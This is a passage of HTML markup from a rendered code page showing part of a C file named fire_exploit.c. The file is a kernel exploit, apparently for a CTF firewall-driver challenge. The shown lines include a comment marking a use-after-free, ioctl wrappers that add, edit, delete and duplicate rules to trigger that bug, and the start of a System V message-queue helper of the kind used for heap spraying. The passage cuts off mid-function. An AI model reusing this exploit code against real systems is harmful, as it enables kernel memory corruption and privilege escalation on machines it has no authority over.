          <td id="file-fire_exploit-c-LC83" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">hexprint</span>(<span class="pl-k">char</span> *buffer, <span class="pl-k">unsigned</span> <span class="pl-k">int</span> bytes) <span class="pl-c"><span class="pl-c">//</span> print like gdb qwords, we round to nearest dqword</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L84" class="blob-num js-line-number js-code-nav-line-number" data-line-number="84"></td>
          <td id="file-fire_exploit-c-LC84" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L85" class="blob-num js-line-number js-code-nav-line-number" data-line-number="85"></td>
          <td id="file-fire_exploit-c-LC85" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> dqwords = ((bytes + <span class="pl-c1">0x10</span> - <span class="pl-c1">1</span>)&amp;<span class="pl-c1">0xfffffff0</span>) / <span class="pl-c1">0x10</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L86" class="blob-num js-line-number js-code-nav-line-number" data-line-number="86"></td>
          <td id="file-fire_exploit-c-LC86" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> qwords = dqwords * <span class="pl-c1">2</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L87" class="blob-num js-line-number js-code-nav-line-number" data-line-number="87"></td>
          <td id="file-fire_exploit-c-LC87" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; qwords; i+=<span class="pl-c1">2</span>)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L88" class="blob-num js-line-number js-code-nav-line-number" data-line-number="88"></td>
          <td id="file-fire_exploit-c-LC88" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L89" class="blob-num js-line-number js-code-nav-line-number" data-line-number="89"></td>
          <td id="file-fire_exploit-c-LC89" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>0x<span class="pl-c1">%04llx</span>: 0x<span class="pl-c1">%016llx</span> 0x<span class="pl-c1">%016llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, (i * <span class="pl-c1">0x8</span>), ((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span>*)buffer)[i], ((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span>*)buffer)[i+<span class="pl-c1">1</span>]);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L90" class="blob-num js-line-number js-code-nav-line-number" data-line-number="90"></td>
          <td id="file-fire_exploit-c-LC90" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L91" class="blob-num js-line-number js-code-nav-line-number" data-line-number="91"></td>
          <td id="file-fire_exploit-c-LC91" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>-----------------------------------------------<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L92" class="blob-num js-line-number js-code-nav-line-number" data-line-number="92"></td>
          <td id="file-fire_exploit-c-LC92" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L93" class="blob-num js-line-number js-code-nav-line-number" data-line-number="93"></td>
          <td id="file-fire_exploit-c-LC93" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L94" class="blob-num js-line-number js-code-nav-line-number" data-line-number="94"></td>
          <td id="file-fire_exploit-c-LC94" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L95" class="blob-num js-line-number js-code-nav-line-number" data-line-number="95"></td>
          <td id="file-fire_exploit-c-LC95" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">gen_dot_notation</span>(<span class="pl-k">char</span> *buf, <span class="pl-c1">uint32_t</span> val)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L96" class="blob-num js-line-number js-code-nav-line-number" data-line-number="96"></td>
          <td id="file-fire_exploit-c-LC96" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L97" class="blob-num js-line-number js-code-nav-line-number" data-line-number="97"></td>
          <td id="file-fire_exploit-c-LC97" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">sprintf</span>(buf, <span class="pl-s"><span class="pl-pds">"</span><span class="pl-c1">%d</span>.<span class="pl-c1">%d</span>.<span class="pl-c1">%d</span>.<span class="pl-c1">%d</span><span class="pl-pds">"</span></span>, val &amp; <span class="pl-c1">0x000000FF</span>, (val &amp; <span class="pl-c1">0x0000FF00</span>) &gt;&gt; <span class="pl-c1">8</span>, (val &amp; <span class="pl-c1">0x00FF0000</span>) &gt;&gt; <span class="pl-c1">16</span>, (val &amp; <span class="pl-c1">0xFF000000</span>) &gt;&gt; <span class="pl-c1">24</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L98" class="blob-num js-line-number js-code-nav-line-number" data-line-number="98"></td>
          <td id="file-fire_exploit-c-LC98" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L99" class="blob-num js-line-number js-code-nav-line-number" data-line-number="99"></td>
          <td id="file-fire_exploit-c-LC99" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L100" class="blob-num js-line-number js-code-nav-line-number" data-line-number="100"></td>
          <td id="file-fire_exploit-c-LC100" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L101" class="blob-num js-line-number js-code-nav-line-number" data-line-number="101"></td>
          <td id="file-fire_exploit-c-LC101" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">//</span> we have a 0x2d UAF</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L102" class="blob-num js-line-number js-code-nav-line-number" data-line-number="102"></td>
          <td id="file-fire_exploit-c-LC102" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">generate</span>(<span class="pl-k">char</span> *input, <span class="pl-c1">user_rule_t</span> *req)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L103" class="blob-num js-line-number js-code-nav-line-number" data-line-number="103"></td>
          <td id="file-fire_exploit-c-LC103" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L104" class="blob-num js-line-number js-code-nav-line-number" data-line-number="104"></td>
          <td id="file-fire_exploit-c-LC104" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> addr[<span class="pl-c1">0x10</span>];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L105" class="blob-num js-line-number js-code-nav-line-number" data-line-number="105"></td>
          <td id="file-fire_exploit-c-LC105" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> ip = *(<span class="pl-c1">uint32_t</span> *)&amp;input[<span class="pl-c1">0x20</span>];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L106" class="blob-num js-line-number js-code-nav-line-number" data-line-number="106"></td>
          <td id="file-fire_exploit-c-LC106" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> netmask = *(<span class="pl-c1">uint32_t</span> *)&amp;input[<span class="pl-c1">0x24</span>];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L107" class="blob-num js-line-number js-code-nav-line-number" data-line-number="107"></td>
          <td id="file-fire_exploit-c-LC107" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L108" class="blob-num js-line-number js-code-nav-line-number" data-line-number="108"></td>
          <td id="file-fire_exploit-c-LC108" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(addr, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(addr));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L109" class="blob-num js-line-number js-code-nav-line-number" data-line-number="109"></td>
          <td id="file-fire_exploit-c-LC109" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">gen_dot_notation</span>(addr, ip);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L110" class="blob-num js-line-number js-code-nav-line-number" data-line-number="110"></td>
          <td id="file-fire_exploit-c-LC110" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)req-&gt;<span class="pl-smi">ip</span>, addr, <span class="pl-c1">0x10</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L111" class="blob-num js-line-number js-code-nav-line-number" data-line-number="111"></td>
          <td id="file-fire_exploit-c-LC111" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L112" class="blob-num js-line-number js-code-nav-line-number" data-line-number="112"></td>
          <td id="file-fire_exploit-c-LC112" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(addr, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(addr));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L113" class="blob-num js-line-number js-code-nav-line-number" data-line-number="113"></td>
          <td id="file-fire_exploit-c-LC113" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">gen_dot_notation</span>(addr, netmask);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L114" class="blob-num js-line-number js-code-nav-line-number" data-line-number="114"></td>
          <td id="file-fire_exploit-c-LC114" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)req-&gt;<span class="pl-smi">netmask</span>, addr, <span class="pl-c1">0x10</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L115" class="blob-num js-line-number js-code-nav-line-number" data-line-number="115"></td>
          <td id="file-fire_exploit-c-LC115" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L116" class="blob-num js-line-number js-code-nav-line-number" data-line-number="116"></td>
          <td id="file-fire_exploit-c-LC116" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)req-&gt;<span class="pl-smi">iface</span>, input, <span class="pl-c1">0x10</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L117" class="blob-num js-line-number js-code-nav-line-number" data-line-number="117"></td>
          <td id="file-fire_exploit-c-LC117" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)req-&gt;<span class="pl-smi">name</span>, (<span class="pl-k">void</span> *)&amp;input[<span class="pl-c1">0x10</span>], <span class="pl-c1">0x10</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L118" class="blob-num js-line-number js-code-nav-line-number" data-line-number="118"></td>
          <td id="file-fire_exploit-c-LC118" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)&amp;req-&gt;<span class="pl-smi">proto</span>, (<span class="pl-k">void</span> *)&amp;input[<span class="pl-c1">0x28</span>], <span class="pl-c1">2</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L119" class="blob-num js-line-number js-code-nav-line-number" data-line-number="119"></td>
          <td id="file-fire_exploit-c-LC119" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)&amp;req-&gt;<span class="pl-smi">port</span>, (<span class="pl-k">void</span> *)&amp;input[<span class="pl-c1">0x28</span> + <span class="pl-c1">2</span>], <span class="pl-c1">2</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L120" class="blob-num js-line-number js-code-nav-line-number" data-line-number="120"></td>
          <td id="file-fire_exploit-c-LC120" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)&amp;req-&gt;<span class="pl-smi">action</span>, (<span class="pl-k">void</span> *)&amp;input[<span class="pl-c1">0x28</span> + <span class="pl-c1">2</span> + <span class="pl-c1">2</span>], <span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L121" class="blob-num js-line-number js-code-nav-line-number" data-line-number="121"></td>
          <td id="file-fire_exploit-c-LC121" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L122" class="blob-num js-line-number js-code-nav-line-number" data-line-number="122"></td>
          <td id="file-fire_exploit-c-LC122" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L123" class="blob-num js-line-number js-code-nav-line-number" data-line-number="123"></td>
          <td id="file-fire_exploit-c-LC123" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L124" class="blob-num js-line-number js-code-nav-line-number" data-line-number="124"></td>
          <td id="file-fire_exploit-c-LC124" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L125" class="blob-num js-line-number js-code-nav-line-number" data-line-number="125"></td>
          <td id="file-fire_exploit-c-LC125" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">ioctl</span>(<span class="pl-k">int</span> fd, <span class="pl-k">unsigned</span> <span class="pl-k">long</span> request, <span class="pl-k">unsigned</span> <span class="pl-k">long</span> param) <span class="pl-c"><span class="pl-c">//</span>ioctl wrapper</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L126" class="blob-num js-line-number js-code-nav-line-number" data-line-number="126"></td>
          <td id="file-fire_exploit-c-LC126" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L127" class="blob-num js-line-number js-code-nav-line-number" data-line-number="127"></td>
          <td id="file-fire_exploit-c-LC127" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-bu">syscall</span>(__NR_ioctl, fd, request, param);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L128" class="blob-num js-line-number js-code-nav-line-number" data-line-number="128"></td>
          <td id="file-fire_exploit-c-LC128" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L129" class="blob-num js-line-number js-code-nav-line-number" data-line-number="129"></td>
          <td id="file-fire_exploit-c-LC129" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L130" class="blob-num js-line-number js-code-nav-line-number" data-line-number="130"></td>
          <td id="file-fire_exploit-c-LC130" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">add</span>(<span class="pl-k">int</span> fd, <span class="pl-c1">uint8_t</span> idx, <span class="pl-k">char</span> *buffer, <span class="pl-k">int</span> type)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L131" class="blob-num js-line-number js-code-nav-line-number" data-line-number="131"></td>
          <td id="file-fire_exploit-c-LC131" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L132" class="blob-num js-line-number js-code-nav-line-number" data-line-number="132"></td>
          <td id="file-fire_exploit-c-LC132" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">user_rule_t</span> rule;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L133" class="blob-num js-line-number js-code-nav-line-number" data-line-number="133"></td>
          <td id="file-fire_exploit-c-LC133" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)&amp;rule, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">user_rule_t</span>));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L134" class="blob-num js-line-number js-code-nav-line-number" data-line-number="134"></td>
          <td id="file-fire_exploit-c-LC134" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">generate</span>(buffer, (<span class="pl-c1">user_rule_t</span> *)&amp;rule);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L135" class="blob-num js-line-number js-code-nav-line-number" data-line-number="135"></td>
          <td id="file-fire_exploit-c-LC135" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">idx</span> = idx;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L136" class="blob-num js-line-number js-code-nav-line-number" data-line-number="136"></td>
          <td id="file-fire_exploit-c-LC136" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">type</span> = type;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L137" class="blob-num js-line-number js-code-nav-line-number" data-line-number="137"></td>
          <td id="file-fire_exploit-c-LC137" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">ioctl</span>(fd, ADD_RULE, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;rule);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L138" class="blob-num js-line-number js-code-nav-line-number" data-line-number="138"></td>
          <td id="file-fire_exploit-c-LC138" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L139" class="blob-num js-line-number js-code-nav-line-number" data-line-number="139"></td>
          <td id="file-fire_exploit-c-LC139" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L140" class="blob-num js-line-number js-code-nav-line-number" data-line-number="140"></td>
          <td id="file-fire_exploit-c-LC140" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> delete(<span class="pl-k">int</span> fd, <span class="pl-c1">uint8_t</span> idx, <span class="pl-k">int</span> type)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L141" class="blob-num js-line-number js-code-nav-line-number" data-line-number="141"></td>
          <td id="file-fire_exploit-c-LC141" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L142" class="blob-num js-line-number js-code-nav-line-number" data-line-number="142"></td>
          <td id="file-fire_exploit-c-LC142" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">user_rule_t</span> rule;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L143" class="blob-num js-line-number js-code-nav-line-number" data-line-number="143"></td>
          <td id="file-fire_exploit-c-LC143" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)&amp;rule, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">user_rule_t</span>));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L144" class="blob-num js-line-number js-code-nav-line-number" data-line-number="144"></td>
          <td id="file-fire_exploit-c-LC144" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">idx</span> = idx;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L145" class="blob-num js-line-number js-code-nav-line-number" data-line-number="145"></td>
          <td id="file-fire_exploit-c-LC145" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">type</span> = type;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L146" class="blob-num js-line-number js-code-nav-line-number" data-line-number="146"></td>
          <td id="file-fire_exploit-c-LC146" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">ioctl</span>(fd, DELETE_RULE, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;rule);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L147" class="blob-num js-line-number js-code-nav-line-number" data-line-number="147"></td>
          <td id="file-fire_exploit-c-LC147" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L148" class="blob-num js-line-number js-code-nav-line-number" data-line-number="148"></td>
          <td id="file-fire_exploit-c-LC148" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L149" class="blob-num js-line-number js-code-nav-line-number" data-line-number="149"></td>
          <td id="file-fire_exploit-c-LC149" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">edit</span>(<span class="pl-k">int</span> fd, <span class="pl-c1">uint8_t</span> idx, <span class="pl-k">char</span> *buffer, <span class="pl-k">int</span> type, <span class="pl-k">int</span> invalidate)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L150" class="blob-num js-line-number js-code-nav-line-number" data-line-number="150"></td>
          <td id="file-fire_exploit-c-LC150" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L151" class="blob-num js-line-number js-code-nav-line-number" data-line-number="151"></td>
          <td id="file-fire_exploit-c-LC151" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">user_rule_t</span> rule;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L152" class="blob-num js-line-number js-code-nav-line-number" data-line-number="152"></td>
          <td id="file-fire_exploit-c-LC152" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)&amp;rule, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">user_rule_t</span>));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L153" class="blob-num js-line-number js-code-nav-line-number" data-line-number="153"></td>
          <td id="file-fire_exploit-c-LC153" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">generate</span>(buffer, (<span class="pl-c1">user_rule_t</span> *)&amp;rule);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L154" class="blob-num js-line-number js-code-nav-line-number" data-line-number="154"></td>
          <td id="file-fire_exploit-c-LC154" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">idx</span> = idx;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L155" class="blob-num js-line-number js-code-nav-line-number" data-line-number="155"></td>
          <td id="file-fire_exploit-c-LC155" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">type</span> = type;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L156" class="blob-num js-line-number js-code-nav-line-number" data-line-number="156"></td>
          <td id="file-fire_exploit-c-LC156" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (invalidate)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L157" class="blob-num js-line-number js-code-nav-line-number" data-line-number="157"></td>
          <td id="file-fire_exploit-c-LC157" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L158" class="blob-num js-line-number js-code-nav-line-number" data-line-number="158"></td>
          <td id="file-fire_exploit-c-LC158" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">strcpy</span>((<span class="pl-k">void</span> *)&amp;rule.<span class="pl-smi">ip</span>, <span class="pl-s"><span class="pl-pds">"</span>invalid<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L159" class="blob-num js-line-number js-code-nav-line-number" data-line-number="159"></td>
          <td id="file-fire_exploit-c-LC159" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">strcpy</span>((<span class="pl-k">void</span> *)&amp;rule.<span class="pl-smi">netmask</span>, <span class="pl-s"><span class="pl-pds">"</span>invalid<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L160" class="blob-num js-line-number js-code-nav-line-number" data-line-number="160"></td>
          <td id="file-fire_exploit-c-LC160" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L161" class="blob-num js-line-number js-code-nav-line-number" data-line-number="161"></td>
          <td id="file-fire_exploit-c-LC161" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">ioctl</span>(fd, EDIT_RULE, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;rule);   </td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L162" class="blob-num js-line-number js-code-nav-line-number" data-line-number="162"></td>
          <td id="file-fire_exploit-c-LC162" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L163" class="blob-num js-line-number js-code-nav-line-number" data-line-number="163"></td>
          <td id="file-fire_exploit-c-LC163" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L164" class="blob-num js-line-number js-code-nav-line-number" data-line-number="164"></td>
          <td id="file-fire_exploit-c-LC164" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">duplicate</span>(<span class="pl-k">int</span> fd, <span class="pl-c1">uint8_t</span> idx, <span class="pl-k">int</span> type)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L165" class="blob-num js-line-number js-code-nav-line-number" data-line-number="165"></td>
          <td id="file-fire_exploit-c-LC165" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L166" class="blob-num js-line-number js-code-nav-line-number" data-line-number="166"></td>
          <td id="file-fire_exploit-c-LC166" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">user_rule_t</span> rule;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L167" class="blob-num js-line-number js-code-nav-line-number" data-line-number="167"></td>
          <td id="file-fire_exploit-c-LC167" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)&amp;rule, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">user_rule_t</span>));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L168" class="blob-num js-line-number js-code-nav-line-number" data-line-number="168"></td>
          <td id="file-fire_exploit-c-LC168" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">idx</span> = idx;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L169" class="blob-num js-line-number js-code-nav-line-number" data-line-number="169"></td>
          <td id="file-fire_exploit-c-LC169" class="blob-code blob-code-inner js-file-line">    rule.<span class="pl-smi">type</span> = type;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L170" class="blob-num js-line-number js-code-nav-line-number" data-line-number="170"></td>
          <td id="file-fire_exploit-c-LC170" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">ioctl</span>(fd, DUP_RULE, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;rule);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L171" class="blob-num js-line-number js-code-nav-line-number" data-line-number="171"></td>
          <td id="file-fire_exploit-c-LC171" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L172" class="blob-num js-line-number js-code-nav-line-number" data-line-number="172"></td>
          <td id="file-fire_exploit-c-LC172" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L173" class="blob-num js-line-number js-code-nav-line-number" data-line-number="173"></td>
          <td id="file-fire_exploit-c-LC173" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">int32_t</span> <span class="pl-en">make_queue</span>(<span class="pl-c1">key_t</span> key, <span class="pl-k">int</span> msgflg)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L174" class="blob-num js-line-number js-code-nav-line-number" data-line-number="174"></td>
          <td id="file-fire_exploit-c-LC174" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L175" class="blob-num js-line-number js-code-nav-line-number" data-line-number="175"></td>
          <td id="file-fire_exploit-c-LC175" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">int32_t</span> result;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L176" class="blob-num js-line-number js-code-nav-line-number" data-line-number="176"></td>
          <td id="file-fire_exploit-c-LC176" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> ((result = <span class="pl-c1">msgget</span>(key, msgflg)) == -<span class="pl-c1">1</span>) </td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L177" class="blob-num js-line-number js-code-nav-line-number" data-line-number="177"></td>
          <td id="file-fire_exploit-c-LC177" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L178" class="blob-num js-line-number js-code-nav-line-number" data-line-number="178"></td>
          <td id="file-fire_exploit-c-LC178" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>msgget failure<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L179" class="blob-num js-line-number js-code-nav-line-number" data-line-number="179"></td>
          <td id="file-fire_exploit-c-LC179" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L180" class="blob-num js-line-number js-code-nav-line-number" data-line-number="180"></td>
          <td id="file-fire_exploit-c-LC180" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L181" class="blob-num js-line-number js-code-nav-line-number" data-line-number="181"></td>
